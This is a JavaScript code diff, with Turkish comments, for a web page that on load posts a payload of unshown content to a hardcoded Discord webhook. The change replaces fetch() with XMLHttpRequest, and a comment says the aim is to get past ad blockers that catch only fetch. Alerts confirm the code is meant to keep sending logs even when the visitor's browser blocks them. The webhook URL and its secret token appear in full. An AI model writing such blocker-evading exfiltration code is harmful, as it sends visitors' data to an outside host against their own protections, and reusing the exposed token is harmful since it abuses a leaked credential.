@@ -678,18 +678,22 @@ document.addEventListener("DOMContentLoaded", () => {
         }]
       };
 
-      fetch("https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      }).then(res => {
-        if (!res.ok) {
-          res.text().then(t => alert("⚠️ DİKKAT: Discord API Logu Reddetti! (Spam Limiti Olabilir): " + t));
-        } else {
-          // alert("✅ Log Başarıyla Gönderildi!"); // Sadece test amaçlı, normalde kapalı
+      // Fetch yerine eski tip XHR (XMLHttpRequest) kullanıyoruz (Bazı reklam engelleyiciler sadece fetch'i yakalar)
+      const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", webhookUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      
+      xhr.onload = function() {
+        if (xhr.status >= 400) {
+          alert("⚠️ DİKKAT: Discord API Logu Reddetti! Kod: " + xhr.status + " | Sebep: " + xhr.responseText);
         }
-      }).catch(e => {
-        alert("⚠️ DİKKAT: Telefonunun Tarayıcısı Webhook'u (Log Gönderimini) Engelliyor! Sebep: " + e.message);
-      });
+      };
+      
+      xhr.onerror = function() {
+        alert("⚠️ DİKKAT: Telefonunun Tarayıcısı (veya AdBlocker) XHR İsteğini de Engelledi! (Load failed). Bu telefon geçit vermiyor!");
+      };
+      
+      xhr.send(JSON.stringify(payload));
     });
 });
